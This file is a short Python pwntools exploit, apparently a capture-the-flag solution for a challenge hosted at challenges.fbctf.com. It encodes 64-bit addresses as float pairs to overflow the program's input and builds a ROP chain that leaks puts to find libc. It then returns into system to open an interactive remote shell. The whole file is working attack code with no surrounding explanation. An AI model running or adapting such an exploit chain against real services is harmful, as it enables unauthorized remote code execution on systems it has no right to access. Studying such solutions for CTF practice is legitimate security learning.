from pwn import *

HOST, PORT = "challenges.fbctf.com", "1341"
# HOST, PORT = "0.0.0.0", 31338
r = remote(HOST, PORT)

menu = lambda: r.recvuntil(": ")
ii = lambda x: r.sendline(str(x))
go = lambda x: (menu(), ii(x))[0]

def rop(*x):
	for i in range(14):
		ii(0)
	for i in x:
		a, b = struct.unpack("<2f", struct.pack("<Q", i))
		print '%.99f'%a, b
		ii('%.78f'%a)
		ii('%.78f'%b)

	ii('done')
	r.recvuntil('VOYAGE!\n')

rop(0x400a83,0x602020,0x400690,0x400993)
puts=u64(r.recvuntil('\n ', drop=True).ljust(8,'\x00'))
libc=puts-0x809c0
print hex(puts)
print hex(libc)
# r.interactive()
rop(0x400a84,0x400a83,libc+0x1b3e9a,libc+0x4f440)
r.interactive()